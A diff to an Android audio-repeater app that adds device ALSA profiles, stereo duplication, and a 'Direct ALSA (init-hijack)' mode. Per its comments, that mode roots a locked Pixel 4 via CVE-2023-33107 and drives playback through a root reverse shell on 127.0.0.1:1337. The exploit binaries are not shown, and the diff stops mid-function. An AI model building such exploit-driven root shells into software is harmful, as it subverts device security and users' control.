@@ -75,11 +75,15 @@ import androidx.compose.ui.text.style.TextOverflow
 import androidx.compose.ui.unit.dp
 import com.a2m.audiorepeater.ui.theme.AudioRepeaterTheme
 import java.io.EOFException
+import java.io.BufferedReader
 import java.io.File
 import java.io.FileInputStream
 import java.io.FileOutputStream
 import java.io.OutputStream
 import java.io.RandomAccessFile
+import java.net.InetAddress
+import java.net.ServerSocket
+import java.net.Socket
 import java.nio.charset.StandardCharsets
 import java.util.Locale
 import java.util.UUID
@@ -131,8 +135,17 @@ private fun AudioRepeaterApp(debugAudioConfig: DebugAudioConfig? = null) {
     var useDirectAlsa by rememberSaveable {
         mutableStateOf(debugAudioConfig?.useDirectAlsa ?: false)
     }
+    var useDirectAlsaInitHijack by rememberSaveable {
+        mutableStateOf(debugAudioConfig?.useDirectAlsaInitHijack ?: false)
+    }
     var playbackPathStatus by remember {
-        mutableStateOf(selectedPlaybackPathStatus(useDirectAlsa, useAaudioExclusive))
+        mutableStateOf(
+            selectedPlaybackPathStatus(
+                useDirectAlsa,
+                useAaudioExclusive,
+                useDirectAlsaInitHijack
+            )
+        )
     }
     val player = remember {
         AudioQueuePlayer(
@@ -214,6 +227,7 @@ private fun AudioRepeaterApp(debugAudioConfig: DebugAudioConfig? = null) {
                 differentFileDelaySeconds = "1.0",
                 useAaudioExclusive = false,
                 useDirectAlsa = false,
+                useDirectAlsaInitHijack = false,
                 useLowLatencyAudioTrack = false,
                 forceStereoRouteAssist = false,
                 directAlsaPcmDevice = null,
@@ -233,6 +247,7 @@ private fun AudioRepeaterApp(debugAudioConfig: DebugAudioConfig? = null) {
                     differentFileDelaySeconds = currentConfig?.differentFileDelaySeconds ?: "1.0",
                     useAaudioExclusive = currentConfig?.useAaudioExclusive ?: false,
                     useDirectAlsa = currentConfig?.useDirectAlsa ?: false,
+                    useDirectAlsaInitHijack = currentConfig?.useDirectAlsaInitHijack ?: false,
                     useLowLatencyAudioTrack = currentConfig?.useLowLatencyAudioTrack ?: false,
                     forceStereoRouteAssist = currentConfig?.forceStereoRouteAssist ?: false,
                     directAlsaPcmDevice = currentConfig?.directAlsaPcmDevice,
@@ -267,9 +282,11 @@ private fun AudioRepeaterApp(debugAudioConfig: DebugAudioConfig? = null) {
         differentFileDelayText = activeConfig.differentFileDelaySeconds
         useAaudioExclusive = activeConfig.useAaudioExclusive
         useDirectAlsa = activeConfig.useDirectAlsa
+        useDirectAlsaInitHijack = activeConfig.useDirectAlsaInitHijack
         playbackPathStatus = selectedPlaybackPathStatus(
             activeConfig.useDirectAlsa,
-            activeConfig.useAaudioExclusive
+            activeConfig.useAaudioExclusive,
+            activeConfig.useDirectAlsaInitHijack
         )
         if (activeConfig.autoPlayOnLoad) {
             context.savePersistedDebugAudioConfig(activeConfig)
@@ -286,6 +303,7 @@ private fun AudioRepeaterApp(debugAudioConfig: DebugAudioConfig? = null) {
                 differentFileDelayMillis = activeConfig.differentFileDelaySeconds.toDelayMillisOrNull() ?: 0L,
                 useAaudioExclusive = activeConfig.useAaudioExclusive,
                 useDirectAlsa = activeConfig.useDirectAlsa,
+                useDirectAlsaInitHijack = activeConfig.useDirectAlsaInitHijack,
                 useLowLatencyAudioTrack = activeConfig.useLowLatencyAudioTrack,
                 forceStereoRouteAssist = activeConfig.forceStereoRouteAssist,
                 directAlsaPcmDevice = activeConfig.directAlsaPcmDevice
@@ -324,13 +342,15 @@ private fun AudioRepeaterApp(debugAudioConfig: DebugAudioConfig? = null) {
                         useDirectAlsa = checked
                         if (checked) {
                             useAaudioExclusive = false
+                            useDirectAlsaInitHijack = false
                         }
                         playbackPathStatus = selectedPlaybackPathStatus(
                             checked,
-                            useAaudioExclusive
+                            useAaudioExclusive,
+                            useDirectAlsaInitHijack
                         )
                     },
-                    enabled = !isPlaying
+                    enabled = !isPlaying && !useDirectAlsaInitHijack
                 )
                 Column(modifier = Modifier.weight(1f)) {
                     Text(
@@ -350,15 +370,52 @@ private fun AudioRepeaterApp(debugAudioConfig: DebugAudioConfig? = null) {
                 verticalAlignment = Alignment.CenterVertically
             ) {
                 Checkbox(
-                    checked = useAaudioExclusive,
+                    checked = useDirectAlsaInitHijack,
                     onCheckedChange = { checked ->
-                        useAaudioExclusive = checked
+                        useDirectAlsaInitHijack = checked
+                        if (checked) {
+                            useDirectAlsa = false
+                            useAaudioExclusive = false
+                        }
                         playbackPathStatus = selectedPlaybackPathStatus(
                             useDirectAlsa,
+                            useAaudioExclusive,
                             checked
                         )
                     },
                     enabled = !isPlaying && !useDirectAlsa
+                )
+                Column(modifier = Modifier.weight(1f)) {
+                    Text(
+                        text = "Direct ALSA (init-hijack)",
+                        style = MaterialTheme.typography.bodyLarge
+                    )
+                    Text(
+                        text = "Pixel 4 · CVE-2023-33107 root · 보안 경고",
+                        style = MaterialTheme.typography.bodySmall,
+                        color = MaterialTheme.colorScheme.error
+                    )
+                }
+            }
+
+            Row(
+                modifier = Modifier.fillMaxWidth(),
+                verticalAlignment = Alignment.CenterVertically
+            ) {
+                Checkbox(
+                    checked = useAaudioExclusive,
+                    onCheckedChange = { checked ->
+                        useAaudioExclusive = checked
+                        if (checked) {
+                            useDirectAlsaInitHijack = false
+                        }
+                        playbackPathStatus = selectedPlaybackPathStatus(
+                            useDirectAlsa,
+                            checked,
+                            useDirectAlsaInitHijack
+                        )
+                    },
+                    enabled = !isPlaying && !useDirectAlsa && !useDirectAlsaInitHijack
                 )
                 Column(modifier = Modifier.weight(1f)) {
                     Text(
@@ -465,6 +522,7 @@ private fun AudioRepeaterApp(debugAudioConfig: DebugAudioConfig? = null) {
                             differentFileDelayMillis = differentFileDelayMillis ?: 0L,
                             useAaudioExclusive = useAaudioExclusive,
                             useDirectAlsa = useDirectAlsa,
+                            useDirectAlsaInitHijack = useDirectAlsaInitHijack,
                             useLowLatencyAudioTrack = false,
                             forceStereoRouteAssist = false,
                             directAlsaPcmDevice = null
@@ -740,6 +798,7 @@ private data class DebugAudioConfig(
     val differentFileDelaySeconds: String,
     val useAaudioExclusive: Boolean,
     val useDirectAlsa: Boolean,
+    val useDirectAlsaInitHijack: Boolean,
     val useLowLatencyAudioTrack: Boolean,
     val forceStereoRouteAssist: Boolean,
     val directAlsaPcmDevice: Int?,
@@ -757,6 +816,8 @@ private data class DebugAudioConfig(
                 differentFileDelaySeconds = intent.getStringExtra(DEBUG_DIFFERENT_DELAY_EXTRA) ?: "0",
                 useAaudioExclusive = intent.getBooleanExtra(DEBUG_AAUDIO_EXCLUSIVE_EXTRA, false),
                 useDirectAlsa = intent.getBooleanExtra(DEBUG_DIRECT_ALSA_EXTRA, false),
+                useDirectAlsaInitHijack =
+                    intent.getBooleanExtra(DEBUG_DIRECT_ALSA_INIT_HIJACK_EXTRA, false),
                 useLowLatencyAudioTrack =
                     intent.getBooleanExtra(DEBUG_LOW_LATENCY_AUDIOTRACK_EXTRA, false),
                 forceStereoRouteAssist =
@@ -782,6 +843,7 @@ private fun Context.savePersistedDebugAudioConfig(config: DebugAudioConfig) {
         .putString(PERSISTED_PLAYLIST_DIFFERENT_DELAY, config.differentFileDelaySeconds)
         .putBoolean(PERSISTED_PLAYLIST_AAUDIO, config.useAaudioExclusive)
         .putBoolean(PERSISTED_PLAYLIST_DIRECT_ALSA, config.useDirectAlsa)
+        .putBoolean(PERSISTED_PLAYLIST_INIT_HIJACK, config.useDirectAlsaInitHijack)
         .putBoolean(PERSISTED_PLAYLIST_LOW_LATENCY, config.useLowLatencyAudioTrack)
         .putBoolean(PERSISTED_PLAYLIST_ROUTE_ASSIST, config.forceStereoRouteAssist)
         .putInt(PERSISTED_PLAYLIST_PCM_DEVICE, config.directAlsaPcmDevice ?: -1)
@@ -807,6 +869,8 @@ private fun Context.loadPersistedDebugAudioConfig(): DebugAudioConfig? {
             preferences.getString(PERSISTED_PLAYLIST_DIFFERENT_DELAY, "0") ?: "0",
         useAaudioExclusive = preferences.getBoolean(PERSISTED_PLAYLIST_AAUDIO, false),
         useDirectAlsa = preferences.getBoolean(PERSISTED_PLAYLIST_DIRECT_ALSA, false),
+        useDirectAlsaInitHijack =
+            preferences.getBoolean(PERSISTED_PLAYLIST_INIT_HIJACK, false),
         useLowLatencyAudioTrack =
             preferences.getBoolean(PERSISTED_PLAYLIST_LOW_LATENCY, false),
         forceStereoRouteAssist =
@@ -844,10 +908,12 @@ private fun Context.setPersistedPlaybackEnabled(localPath: String, enabled: Bool
 
 private fun selectedPlaybackPathStatus(
     useDirectAlsa: Boolean,
-    useAaudioExclusive: Boolean
+    useAaudioExclusive: Boolean,
+    useDirectAlsaInitHijack: Boolean = false
 ): String {
     return when {
         useDirectAlsa -> "선택: Direct ALSA (root / TinyALSA pcm_write)"
+        useDirectAlsaInitHijack -> "선택: Direct ALSA (init-hijack)"
         useAaudioExclusive -> "선택: AAudio EXCLUSIVE"
         else -> "선택: AudioTrack"
     }
@@ -1123,6 +1189,11 @@ private data class RootAlsaProfile(
             done
             echo "A2M_ALSA_PCM_FDS ${'$'}fd_targets"
             echo "A2M_ALSA_PCM_STATUS ${'$'}(echo "${'$'}pcm_status" | tr '\n' ' ')"
+            case "${'$'}fd_targets" in
+              *"${'$'}expected_node"*)
+                echo "A2M_ALSA_PCM_FD_LIVE node=${'$'}expected_node pid=${'$'}pcm_pid"
+                ;;
+            esac
             if [ "${'$'}pcm_live" -eq 1 ]; then
               echo "A2M_ALSA_PCM_LIVE node=${'$'}expected_node pid=${'$'}pcm_pid"
             fi
@@ -1176,7 +1247,7 @@ private data class RootAlsaProfile(
                         card = 0,
                         pcmDevice = 13,
                         pcmNode = "/dev/snd/pcmC0D13p",
-                        periodSize = 240,
+                        periodSize = 1024,
                         periodCount = 2,
                         tinymixPath = "/data/local/tmp/pixel4_alsa/tinymix",
                         routeQueryCommand = "/data/local/tmp/pixel4_alsa/tinymix -D 0 1611",
@@ -1205,22 +1276,148 @@ private data class RootAlsaProfile(
                             "/data/local/tmp/a2m_tinyalsa/tinymix -D 0 set 317 0"
                     )
                 }
-                "lavender" -> {
-                    require(requestedPcmDevice == null || requestedPcmDevice == 13) {
-                        "Redmi Note 7 direct ALSA only supports PCM13"
+                "frankel" -> {
+                    require(requestedPcmDevice == null || requestedPcmDevice == 1) {
+                        "Pixel 10 direct ALSA only supports PCM1"
                     }
                     RootAlsaProfile(
+                        label = "Pixel 10 frankel EP2",
+                        expectedDevice = "frankel",
+                        card = 0,
+                        pcmDevice = 1,
+                        pcmNode = "/dev/snd/pcmC0D1p",
+                        periodSize = 480,
+                        periodCount = 4,
+                        tinymixPath = "/data/local/tmp/a2m_tinyalsa/tinymix",
+                        routeQueryCommand =
+                            "/data/local/tmp/a2m_tinyalsa/tinymix -D 0 get 294",
+                        routeEnableCommand =
+                            "/data/local/tmp/a2m_tinyalsa/tinymix -D 0 set 294 1",
+                        routeDisableCommand =
+                            "/data/local/tmp/a2m_tinyalsa/tinymix -D 0 set 294 0"
+                    )
+                }
+                "lavender" -> when (requestedPcmDevice ?: 13) {
+                    0 -> RootAlsaProfile(
+                        label = "Redmi Note 7 lavender MultiMedia1",
+                        expectedDevice = "lavender",
+                        card = 0,
+                        pcmDevice = 0,
+                        pcmNode = "/dev/snd/pcmC0D0p",
+                        periodSize = 1024,
+                        periodCount = 4,
+                        tinymixPath = "/data/local/tmp/a2m_tinyalsa_redmi/tinymix",
+                        routeQueryCommand =
+                            "/data/local/tmp/a2m_tinyalsa_redmi/tinymix -D 0 559",
+                        routeEnableCommand =
+                            "/data/local/tmp/a2m_tinyalsa_redmi/tinymix -D 0 559 1",
+                        routeDisableCommand =
+                            "/data/local/tmp/a2m_tinyalsa_redmi/tinymix -D 0 559 0"
+                    )
+                    1 -> RootAlsaProfile(
+                        label = "Redmi Note 7 lavender MultiMedia2",
+                        expectedDevice = "lavender",
+                        card = 0,
+                        pcmDevice = 1,
+                        pcmNode = "/dev/snd/pcmC0D1p",
+                        periodSize = 1024,
+                        periodCount = 4,
+                        tinymixPath = "/data/local/tmp/a2m_tinyalsa_redmi/tinymix",
+                        routeQueryCommand =
+                            "/data/local/tmp/a2m_tinyalsa_redmi/tinymix -D 0 560",
+                        routeEnableCommand =
+                            "/data/local/tmp/a2m_tinyalsa_redmi/tinymix -D 0 560 1",
+                        routeDisableCommand =
+                            "/data/local/tmp/a2m_tinyalsa_redmi/tinymix -D 0 560 0"
+                    )
+                    4 -> RootAlsaProfile(
+                        label = "Redmi Note 7 lavender MultiMedia4 ULL",
+                        expectedDevice = "lavender",
+                        card = 0,
+                        pcmDevice = 4,
+                        pcmNode = "/dev/snd/pcmC0D4p",
+                        periodSize = 1024,
+                        periodCount = 4,
+                        tinymixPath = "/data/local/tmp/a2m_tinyalsa_redmi/tinymix",
+                        routeQueryCommand =
+                            "/data/local/tmp/a2m_tinyalsa_redmi/tinymix -D 0 562",
+                        routeEnableCommand =
+                            "/data/local/tmp/a2m_tinyalsa_redmi/tinymix -D 0 562 1",
+                        routeDisableCommand =
+                            "/data/local/tmp/a2m_tinyalsa_redmi/tinymix -D 0 562 0"
+                    )
+                    13 -> RootAlsaProfile(
                         label = "Redmi Note 7 lavender MultiMedia5",
                         expectedDevice = "lavender",
                         card = 0,
                         pcmDevice = 13,
                         pcmNode = "/dev/snd/pcmC0D13p",
+                        periodSize = 1024,
+                        periodCount = 4,
+                        tinymixPath = "/data/local/tmp/a2m_tinyalsa_redmi/tinymix",
+                        routeQueryCommand =
+                            "/data/local/tmp/a2m_tinyalsa_redmi/tinymix -D 0 563",
+                        routeEnableCommand =
+                            "/data/local/tmp/a2m_tinyalsa_redmi/tinymix -D 0 563 1",
+                        routeDisableCommand =
+                            "/data/local/tmp/a2m_tinyalsa_redmi/tinymix -D 0 563 0"
+                    )
+                    17 -> RootAlsaProfile(
+                        label = "Redmi Note 7 lavender MultiMedia7 MM_NOIRQ",
+                        expectedDevice = "lavender",
+                        card = 0,
+                        pcmDevice = 17,
+                        pcmNode = "/dev/snd/pcmC0D17p",
+                        periodSize = 240,
+                        periodCount = 4,
+                        tinymixPath = "/data/local/tmp/a2m_tinyalsa_redmi/tinymix",
+                        routeQueryCommand =
+                            "/data/local/tmp/a2m_tinyalsa_redmi/tinymix -D 0 565",
+                        routeEnableCommand =
+                            "/data/local/tmp/a2m_tinyalsa_redmi/tinymix -D 0 565 1",
+                        routeDisableCommand =
+                            "/data/local/tmp/a2m_tinyalsa_redmi/tinymix -D 0 565 0"
+                    )
+                    39 -> RootAlsaProfile(
+                        label = "Redmi Note 7 lavender MultiMedia6",
+                        expectedDevice = "lavender",
+                        card = 0,
+                        pcmDevice = 39,
+                        pcmNode = "/dev/snd/pcmC0D39p",
+                        periodSize = 1024,
+                        periodCount = 4,
+                        tinymixPath = "/data/local/tmp/a2m_tinyalsa_redmi/tinymix",
+                        routeQueryCommand =
+                            "/data/local/tmp/a2m_tinyalsa_redmi/tinymix -D 0 564",
+                        routeEnableCommand =
+                            "/data/local/tmp/a2m_tinyalsa_redmi/tinymix -D 0 564 1",
+                        routeDisableCommand =
+                            "/data/local/tmp/a2m_tinyalsa_redmi/tinymix -D 0 564 0"
+                    )
+                    else -> error(
+                        "Redmi Note 7 direct ALSA supports PCM0, PCM1, PCM4, PCM13, PCM17, or PCM39"
+                    )
+                }
+                "beyond1" -> {
+                    require(requestedPcmDevice == null || requestedPcmDevice == 1) {
+                        "Galaxy S10 direct ALSA only supports PCM1"
+                    }
+                    RootAlsaProfile(
+                        label = "Galaxy S10 beyond1 RDMA1",
+                        expectedDevice = "beyond1",
+                        card = 0,
+                        pcmDevice = 1,
+                        pcmNode = "/dev/snd/pcmC0D1p",
                         periodSize = 192,
-                        periodCount = 2,
-                        tinymixPath = "/system/bin/tinymix",
-                        routeQueryCommand = "/system/bin/tinymix -D 0 563",
-                        routeEnableCommand = "/system/bin/tinymix -D 0 563 1",
-                        routeDisableCommand = "/system/bin/tinymix -D 0 563 0"
+                        periodCount = 4,
+                        tinymixPath = "/data/local/tmp/a2m_tinyalsa_s10/tinymix",
+                        routeQueryCommand =
+                            "/data/local/tmp/a2m_tinyalsa_s10/tinymix -D 0 get 1030 " +
+                                "| grep -q '> On' && echo On || echo Off",
+                        routeEnableCommand =
+                            "/data/local/tmp/a2m_tinyalsa_s10/tinymix -D 0 set 1030 1",
+                        routeDisableCommand =
+                            "/data/local/tmp/a2m_tinyalsa_s10/tinymix -D 0 set 1030 0"
                     )
                 }
                 "b2q" -> when (requestedPcmDevice ?: 9) {
@@ -1263,7 +1460,9 @@ private data class RootAlsaProfile(
                 }
                 else -> error(
                     "Direct ALSA는 검증된 Pixel 4(flame), Pixel 7(panther), " +
-                        "Redmi Note 7(lavender), ZFlip3(b2q)에서만 지원합니다: " +
+                        "Pixel 10(frankel), " +
+                        "Redmi Note 7(lavender), Galaxy S10(beyond1), " +
+                        "ZFlip3(b2q)에서만 지원합니다: " +
                         "${Build.MODEL}/${Build.DEVICE}"
                 )
             }
@@ -1310,6 +1509,11 @@ private class AudioQueuePlayer(
     private var currentRootAlsaProfile: RootAlsaProfile? = null
 
     @Volatile
+    private var initHijackShell: InitHijackSession? = null
+
+    private val initHijackShellLock = Any()
+
+    @Volatile
     private var playbackRunId = 0
 
     fun play(
@@ -1318,6 +1522,7 @@ private class AudioQueuePlayer(
         differentFileDelayMillis: Long,
         useAaudioExclusive: Boolean,
         useDirectAlsa: Boolean,
+        useDirectAlsaInitHijack: Boolean,
         useLowLatencyAudioTrack: Boolean,
         forceStereoRouteAssist: Boolean,
         directAlsaPcmDevice: Int?
@@ -1336,6 +1541,7 @@ private class AudioQueuePlayer(
                 differentFileDelayMillis = differentFileDelayMillis,
                 useAaudioExclusive = useAaudioExclusive,
                 useDirectAlsa = useDirectAlsa,
+                useDirectAlsaInitHijack = useDirectAlsaInitHijack,
                 useLowLatencyAudioTrack = useLowLatencyAudioTrack,
                 forceStereoRouteAssist = forceStereoRouteAssist,
                 directAlsaPcmDevice = directAlsaPcmDevice
@@ -1354,6 +1560,8 @@ private class AudioQueuePlayer(
 
     fun release() {
         stop()
+        initHijackShell?.close()
+        initHijackShell = null
         playbackScope.cancel()
     }
 
@@ -1364,11 +1572,13 @@ private class AudioQueuePlayer(
         differentFileDelayMillis: Long,
         useAaudioExclusive: Boolean,
         useDirectAlsa: Boolean,
+        useDirectAlsaInitHijack: Boolean,
         useLowLatencyAudioTrack: Boolean,
         forceStereoRouteAssist: Boolean,
         directAlsaPcmDevice: Int?
     ) {
         val requestedPath = when {
+            useDirectAlsaInitHijack -> "Direct ALSA init-hijack"
             useDirectAlsa -> "Direct ALSA"
             useAaudioExclusive -> "AAudio EXCLUSIVE"
             useLowLatencyAudioTrack -> "AudioTrack LOW_LATENCY"
@@ -1380,6 +1590,15 @@ private class AudioQueuePlayer(
                 "diffDelay=$differentFileDelayMillis requestedPath=$requestedPath"
         )
         try {
+            if (useDirectAlsaInitHijack) {
+                playInitHijackQueue(
+                    runId = runId,
+                    items = items,
+                    sameFileDelayMillis = sameFileDelayMillis,
+                    differentFileDelayMillis = differentFileDelayMillis
+                )
+                return
+            }
             items.forEachIndexed { itemIndex, item ->
                 if (stopped) return
 
@@ -1738,11 +1957,20 @@ private class AudioQueuePlayer(
         directAlsaPcmDevice: Int?
     ) {
         val profile = RootAlsaProfile.current(directAlsaPcmDevice)
+        val forceStereoPayload =
+            wavSpec.channelCount == 1 &&
+                (
+                    profile.expectedDevice == "lavender" &&
+                        profile.pcmDevice in setOf(4, 17) ||
+                        profile.expectedDevice == "beyond1" &&
+                        profile.pcmDevice == 1
+                    )
         val aggregateWav = prepareRootAlsaAggregateWav(
             runId = runId,
             item = item,
             wavSpec = wavSpec,
-            sameFileDelayMillis = sameFileDelayMillis
+            sameFileDelayMillis = sameFileDelayMillis,
+            forceStereoPayload = forceStereoPayload
         )
         val routeAssistChannelCount = if (forceStereoRouteAssist) 2 else wavSpec.channelCount
         val routeAssistChannelMask = if (forceStereoRouteAssist) {
@@ -1750,11 +1978,13 @@ private class AudioQueuePlayer(
         } else {
             wavSpec.channelMask
         }
+        val routeAssistLowLatency =
+            profile.pcmDevice == 0 && profile.expectedDevice in setOf("b2q", "lavender")
         val routeAssistTrack = createSilentRouteAssistTrack(
             sampleRate = wavSpec.sampleRate,
             channelMask = routeAssistChannelMask,
             channelCount = routeAssistChannelCount,
-            lowLatency = profile.expectedDevice == "b2q" && profile.pcmDevice == 0
+            lowLatency = routeAssistLowLatency
         )
         currentRouteAssistTrack = routeAssistTrack
         currentRootAlsaProfile = profile
@@ -1773,7 +2003,7 @@ private class AudioQueuePlayer(
                 LOG_TAG,
                 "ALSA route assist started payload=silence-only sampleRate=${wavSpec.sampleRate} " +
                     "channels=$routeAssistChannelCount forcedStereo=$forceStereoRouteAssist " +
-                    "lowLatency=${profile.expectedDevice == "b2q" && profile.pcmDevice == 0}"
+                    "lowLatency=$routeAssistLowLatency"
             )
             Thread.sleep(ROOT_ALSA_ROUTE_STARTUP_MILLIS)
             if (stopped) return
@@ -1825,6 +2055,9 @@ private class AudioQueuePlayer(
                 (
                     !rootOutput.contains("A2M_ALSA_PCM_LIVE node=${profile.pcmNode}") &&
                         !rootOutput.contains(
+                            "A2M_ALSA_PCM_FD_LIVE node=${profile.pcmNode}"
+                        ) &&
+                        !rootOutput.contains(
                             "A2M_ALSA_PCM_SHORT_COMPLETE requested_node=${profile.pcmNode}"
                         )
                 ) ||
@@ -1872,7 +2105,8 @@ private class AudioQueuePlayer(
         runId: Int,
         item: QueueItem,
         wavSpec: WavPcmSpec,
-        sameFileDelayMillis: Long
+        sameFileDelayMillis: Long,
+        forceStereoPayload: Boolean
     ): File {
         require(
             wavSpec.audioFormat == WAV_FORMAT_PCM &&
@@ -1884,6 +2118,13 @@ private class AudioQueuePlayer(
         require(wavSpec.dataSize % wavSpec.frameSize == 0L) {
             "WAV data is not frame-aligned"
         }
+        if (forceStereoPayload) {
+            require(wavSpec.channelCount == 1 && wavSpec.bitsPerSample == 16) {
+                "Forced stereo Direct ALSA payload requires mono PCM16 source"
+            }
+        }
+        val outputChannelCount = if (forceStereoPayload) 2 else wavSpec.channelCount
+        val outputFrameSize = outputChannelCount * (wavSpec.bitsPerSample / 8)
         val signalFrames = wavSpec.dataSize / wavSpec.frameSize
         val delayFrames = delayMillisToFrameCount(sameFileDelayMillis, wavSpec.sampleRate)
         val proofTailFrames =
@@ -1892,7 +2133,7 @@ private class AudioQueuePlayer(
             signalFrames * item.repeatCount +
                 delayFrames * (item.repeatCount - 1).coerceAtLeast(0) +
                 proofTailFrames
-        val dataBytes = totalFrames * wavSpec.frameSize
+        val dataBytes = totalFrames * outputFrameSize
         require(dataBytes in 1..WAV_UINT32_MAX) {
             "Direct ALSA aggregate WAV is too large: $dataBytes bytes"
         }
@@ -1903,7 +2144,7 @@ private class AudioQueuePlayer(
             FileOutputStream(outputFile).buffered().use { output ->
                 output.writeIntegerPcmWavHeader(
                     sampleRate = wavSpec.sampleRate,
-                    channelCount = wavSpec.channelCount,
+                    channelCount = outputChannelCount,
                     bitsPerSample = wavSpec.bitsPerSample,
                     dataBytes = dataBytes
                 )
@@ -1925,9 +2166,10 @@ private class AudioQueuePlayer(
                         "ALSA repeat prepared file=${item.displayName} " +
                             "repeat=$currentRepeat/${item.repeatCount}"
                     )
-                    framesWritten += writeExactPcmAudioData(
+                    framesWritten += writeRootAlsaPcmAudioData(
                         File(item.localPath),
-                        wavSpec
+                        wavSpec,
+                        forceStereoPayload
                     ) { buffer, byteCount ->
                         output.write(buffer, 0, byteCount)
                     }
@@ -1944,7 +2186,8 @@ private class AudioQueuePlayer(
                         )
                         framesWritten += writeExactPcmSilence(
                             wavSpec,
-                            sameFileDelayMillis
+                            sameFileDelayMillis,
+                            outputFrameSize
                         ) { buffer, byteCount ->
                             output.write(buffer, 0, byteCount)
                         }
@@ -1952,7 +2195,8 @@ private class AudioQueuePlayer(
                 }
                 framesWritten += writeExactPcmSilence(
                     wavSpec,
-                    ROOT_ALSA_PROOF_TAIL_MILLIS
+                    ROOT_ALSA_PROOF_TAIL_MILLIS,
+                    outputFrameSize
                 ) { buffer, byteCount ->
                     output.write(buffer, 0, byteCount)
                 }
@@ -1968,9 +2212,51 @@ private class AudioQueuePlayer(
             LOG_TAG,
             "ALSA aggregate ready file=${item.displayName} frames=$totalFrames " +
                 "bytes=$dataBytes sampleRate=${wavSpec.sampleRate} bits=${wavSpec.bitsPerSample} " +
-                "channels=${wavSpec.channelCount} exactSourceEncoding=true"
+                "channels=$outputChannelCount sourceChannels=${wavSpec.channelCount} " +
+                "stereoDuplicated=$forceStereoPayload exactSourceEncoding=${!forceStereoPayload}"
         )
         return outputFile
+    }
+
+    private fun writeRootAlsaPcmAudioData(
+        file: File,
+        wavSpec: WavPcmSpec,
+        forceStereoPayload: Boolean,
+        writeBuffer: (ByteArray, Int) -> Unit
+    ): Long {
+        if (!forceStereoPayload) {
+            return writeExactPcmAudioData(file, wavSpec, writeBuffer)
+        }
+        require(wavSpec.channelCount == 1 && wavSpec.bitsPerSample == 16)
+        val inputBufferSize = (AUDIO_COPY_BUFFER_SIZE / 2).coerceAtLeast(1) * 2
+        val inputBuffer = ByteArray(inputBufferSize)
+        val stereoBuffer = ByteArray(inputBufferSize * 2)
+        var framesWritten = 0L
+        FileInputStream(file).use { input ->
+            input.skipFully(wavSpec.dataOffset)
+            var remainingBytes = wavSpec.dataSize
+            while (remainingBytes > 0L && !stopped) {
+                val bytesToRead = minOf(inputBufferSize.toLong(), remainingBytes).toInt()
+                input.readFully(inputBuffer, bytesToRead)
+                require(bytesToRead % 2 == 0) { "PCM16 mono data is not sample-aligned" }
+                var inputOffset = 0
+                var outputOffset = 0
+                while (inputOffset < bytesToRead) {
+                    val low = inputBuffer[inputOffset]
+                    val high = inputBuffer[inputOffset + 1]
+                    stereoBuffer[outputOffset] = low
+                    stereoBuffer[outputOffset + 1] = high
+                    stereoBuffer[outputOffset + 2] = low
+                    stereoBuffer[outputOffset + 3] = high
+                    inputOffset += 2
+                    outputOffset += 4
+                }
+                writeBuffer(stereoBuffer, outputOffset)
+                framesWritten += bytesToRead / 2
+                remainingBytes -= bytesToRead.toLong()
+            }
+        }
+        return framesWritten
     }
 
     private fun writeExactPcmAudioData(
@@ -2003,17 +2289,18 @@ private class AudioQueuePlayer(
     private fun writeExactPcmSilence(
         wavSpec: WavPcmSpec,
         delayMillis: Long,
+        outputFrameSize: Int = wavSpec.frameSize,
         writeBuffer: (ByteArray, Int) -> Unit
     ): Long {
         val silenceFrameCount = delayMillisToFrameCount(delayMillis, wavSpec.sampleRate)
         if (silenceFrameCount <= 0L) return 0L
 
-        val framesPerBuffer = maxOf(1, AUDIO_COPY_BUFFER_SIZE / wavSpec.frameSize)
-        val silenceBuffer = ByteArray(framesPerBuffer * wavSpec.frameSize)
+        val framesPerBuffer = maxOf(1, AUDIO_COPY_BUFFER_SIZE / outputFrameSize)
+        val silenceBuffer = ByteArray(framesPerBuffer * outputFrameSize)
         var remainingFrames = silenceFrameCount
         while (remainingFrames > 0L && !stopped) {
             val framesToWrite = minOf(framesPerBuffer.toLong(), remainingFrames).toInt()
-            writeBuffer(silenceBuffer, framesToWrite * wavSpec.frameSize)
+            writeBuffer(silenceBuffer, framesToWrite * outputFrameSize)
             remainingFrames -= framesToWrite.toLong()
         }
         return silenceFrameCount - remainingFrames
@@ -2106,6 +2393,389 @@ private class AudioQueuePlayer(
             process.exitValue() to output
         }.getOrElse { exception ->
             -1 to (exception.message ?: exception.javaClass.simpleName)
+        }
+    }
+
+    /**
+     * Direct ALSA (init-hijack): obtains root on a locked Pixel 4 via the
+     * CVE-2023-33107 init code-page hijack (native libs a2m_perm / a2m_s34) and
+     * drives the verified TinyALSA helper through the root reverse shell that
+     * connects back to 127.0.0.1:1337.
+     */
+    private fun playInitHijackQueue(
+        runId: Int,
+        items: List<QueueItem>,
+        sameFileDelayMillis: Long,
+        differentFileDelayMillis: Long
+    ) {
+        require(Build.DEVICE == "flame") {
+            "Direct ALSA (init-hijack)는 검증된 Pixel 4(flame)에서만 지원합니다"
+        }
+        val profile = RootAlsaProfile.current(null)
+        val workdir = File(context.filesDir, INIT_HIJACK_WORKDIR_NAME).apply { mkdirs() }
+        prepareInitHijackSeedFiles(workdir)
+
+        val server = ensureInitHijackServerSocket()
+        val createdAggregates = mutableListOf<File>()
+
+        // Disable the Play button immediately (even while we wait on the shell
+        // lock / exploit), so repeated taps cannot start overlapping runs.
+        items.firstOrNull()?.let { first ->
+            postState(
+                PlaybackUiState.Playing(
+                    currentUri = first.sourceUri,
+                    currentDisplayName = first.displayName,
+                    currentRepeat = 1,
+                    totalRepeats = first.repeatCount
+                ),
+                runId = runId
+            )
+        }
+
+        // Serialize shell access: a Stop leaves the previous coroutine blocked
+        // on the current file's tinyplay for a few seconds; the next Play waits
+        // for it to unwind, then reuses the SAME root shell (no exploit re-run).
+        synchronized(initHijackShellLock) {
+            val session = acquireInitHijackShell(workdir, server, runId)
+            try {
+                postPathStatus("init-hijack: 재생 중...", runId)
+
+                items.forEachIndexed { itemIndex, item ->
+                    if (stopped) return@forEachIndexed
+
+                    val wavSpec = try {
+                        parseWavPcmFile(File(item.localPath))
+                    } catch (exception: Exception) {
+                        throw IllegalArgumentException(
+                            "Direct ALSA (init-hijack) 경로는 PCM WAV 파일만 재생할 수 있습니다: ${item.displayName}",
+                            exception
+                        )
+                    }
+                    val aggregate = prepareRootAlsaAggregateWav(
+                        runId = runId,
+                        item = item,
+                        wavSpec = wavSpec,
+                        sameFileDelayMillis = sameFileDelayMillis,
+                        forceStereoPayload = false
+                    )
+                    createdAggregates.add(aggregate)
+                    playInitHijackAggregate(session, profile, aggregate, item, wavSpec, runId)
+
